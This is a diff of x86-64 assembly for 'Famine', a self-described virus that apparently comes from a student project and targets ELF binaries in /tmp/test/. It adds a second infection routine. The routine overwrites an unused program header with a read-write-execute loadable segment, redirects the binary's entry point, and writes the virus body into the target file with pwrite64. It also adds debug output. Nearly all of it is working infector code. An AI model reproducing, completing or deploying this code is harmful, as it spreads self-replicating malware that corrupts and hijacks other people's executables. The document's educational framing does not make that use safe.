@@ -17,8 +17,8 @@ print_rax:
     PUSH_ALL
 
     ; Utilisation d’un buffer sur la pile
-    sub     rsp, 32             ; réserver 32 bytes
-    lea     rsi, [rsp + 32]     ; rsi = fin du buffer
+    sub     rsp, 64             ; réserver 32 bytes
+    lea     rsi, [rsp + 64]     ; rsi = fin du buffer
     mov     rcx, 0              ; compteur de caractères
     mov     rbx, rax            ; backup rax dans rbx
 
@@ -41,7 +41,14 @@ print_rax:
     mov     rdx, rcx            ; taille
     syscall
 
-    add     rsp, 32             ; restaurer la pile
+
+	mov		rax, SYS_write
+	mov		rdi, 1
+	lea		rsi, [rel newl]
+	mov		rdx, 1
+	syscall
+
+    add     rsp, 64             ; restaurer la pile
     POP_ALL
     ret
 
@@ -308,7 +315,7 @@ print_rax:
 
 			;call	printf
 
-			call	virus
+			call	infection_1
 
 
 
@@ -332,9 +339,117 @@ print_rax:
 		pop		rax
 		pop		r12
 	ret
+		; elfp0
+		;movzx	rcx, e_phnum
+		;movzx	rdi, e_phentisize
+	infection_0:
+		PUSH_ALLr
+
+		mov		BYTE [rel zero], 1
+		mov		qword [rel p_offset], 0
+		mov		qword [rel p_vaddr], -1
+		mov		qword [rel p_paddr], 0
 
 
-	virus:		; rsi nom du fichier
+		mov		rax, [rel elfb + 0x28]
+		mov		[rel p_offset], rax
+
+		mov		r10, 64 ; offset in file!
+		xor		r15, r15	; gap
+		xor		r11, r11
+		mov		r13, 1
+	.loop:
+		push	r11
+		push	rcx
+		mov		rax, SYS_read
+		mov		rdi, r12
+		lea		rsi, [rel elfp0]
+		mov		rdx, 56
+		syscall
+		pop		rcx
+		pop		r11
+		add		r10, 56
+		cmp		rax, 56
+		jne		.return
+
+		cmp		dword [rel elfp0], 1
+		jne		.no_load
+
+		mov		rax, [rel elfp0 + 0x10]
+		cmp		rax,  [rel p_vaddr]
+		jnb		.no_above
+		mov		[rel p_vaddr], rax
+	.no_above:
+		cmp		dword [rel elfp0 + 0x4], 6
+		jnle	.no_load
+		mov		r15, [rel elfp0 + 0x10]
+		sub		r15, [rel elfp0 + 0x8]
+
+	.no_load:
+		cmp		dword [rel elfp0], 0
+		je		.usseles_ph
+		cmp		dword [rel elfp0], 4
+		je		.usseles_ph
+		cmp		dword [rel elfp0], 5
+		je		.usseles_ph
+		jmp		.not_usseles_ph
+	.usseles_ph:
+		mov		r11, r10
+		xor		r13, r13
+	.not_usseles_ph:
+	dec	rcx
+	jnz	.loop
+
+		mov		rax, [rel p_vaddr]
+		add		rax, [rel elfb + 0x28]
+		add		rax, r15
+		mov		[rel p_vaddr], rax
+		mov		[rel entry], rax
+		mov		[rel p_paddr], rax
+
+		sub		r11, 56;
+
+		mov		rax, SYS_pwrite64
+		mov		rdi, r12
+		lea		rsi, [rel new_programheader]
+		mov		rdx, 56
+		mov		r10, r11
+		syscall
+
+		mov		rax, SYS_pwrite64
+		mov		rdi, r12
+		lea		rsi, [rel p_vaddr]
+		mov		rdx, 8
+		mov		r10, 0x18
+		syscall
+
+
+		mov		rax, SYS_pwrite64
+		mov		rdi, r12
+		lea		rsi, [rel one]
+		mov		rdx, 1
+		mov		r10, 0xa
+		syscall
+
+		; write famine
+
+		lea		rsi, [rel _start]
+		mov		rdx, FAMINE_SIZE
+		mov		r10, [rel p_offset]
+		mov		rdi, r12
+		mov		rax, SYS_pwrite64
+		syscall
+
+
+	.return:
+
+		mov		rax, r13
+		POP_ALLr
+	ret
+
+
+
+	infection_1:		; rsi nom du fichier
 		PUSH_ALL
 
 
@@ -388,16 +503,24 @@ print_rax:
 		; END - CHECKS - ELF64
 
 
+
+		; On essaye la 1ere methode d'infection!
+
+
 		; Here start the injection
 
-		mov		rax, [rel elfb + 0x18]
+		mov		rax, [rel elfb + 0x18]		; e_entry
 		mov		[old_entry], rax
 
-		movzx	rcx, word [rel elfb + 0x38]
-		movzx	rdi, word [rel elfb + 0x36]
+		movzx	rcx, word [rel elfb + 0x38]	; e_phnum
+		movzx	rdi, word [rel elfb + 0x36]	; e_phentisize
 		xor		r11, r11
 		xor		r10, r10
 
+
+		call	infection_0
+		test	rax, rax
+		jz		.close_file
 		; call _add_empty_section
 
 		.start_loop_phdr:
@@ -565,9 +688,9 @@ print_rax:
 	ret
 
 end_:
-
 	mov		rax, [rel entry]
 	mov		[rel new_entry], rax
+
 
 	mov		rax, [rel new_entry]
 	sub		rax, [rel old_entry]
@@ -605,6 +728,8 @@ end_:
 		test	al, al
 		jz		.exit_ret
 
+		mov		rax, [rel new_entry]
+		call	print_rax
 
 		jmp		[rel new_entry]
 
@@ -616,24 +741,38 @@ end_:
 
 ; -----
 
-buff	times 4096 db 0
-newl	times 0001 db 0xa
-path	db '/tmp/test/', 0
-padd	times 0512 db 0
-file	db 'elf64 found!', 0
-msg1	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
-old_entry		   dq 0
-new_entry		   dq 0
-self	db '/proc/self/exe', 0
-last	db '..', 0
-curr	db '.', 0
-elfh	db 0x7f, 'ELF'
-one		db 1
-zero	db 0
-entry	dq 0
-exec	dw 7
-elfb	times 0064 db 0
-elfp0	times 0056 db 0
-elfp1	times 0056 db 0
+
+	buff	times 4096 db 0
+	newl	times 0001 db 0xa
+	path	db '/tmp/test/', 0
+	padd	times 0512 db 0
+	file	db 'elf64 found!', 0
+	msg1	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
+	old_entry		   dq 0
+	new_entry		   dq 0
+	self	db '/proc/self/exe', 0
+	last	db '..', 0
+	curr	db '.', 0
+	elfh	db 0x7f, 'ELF'
+	one		db 1
+	zero	db 0
+	entry	dq 0
+	exec	dw 7
+	elfb	times 0064 db 0
+	elfp0	times 0056 db 0
+	elfp1	times 0056 db 0
+
+; NEW HEADER
+new_programheader:
+	p_type		dd	1
+	p_flags		dd	7
+	p_offset	dq	0
+	p_vaddr		dq	-1
+	p_paddr		dq	0
+	p_filez		dq	FAMINE_SIZE
+	p_memsz		dq	FAMINE_SIZE
+	p_palign	dq	4096
+
+
 
 end_addr:
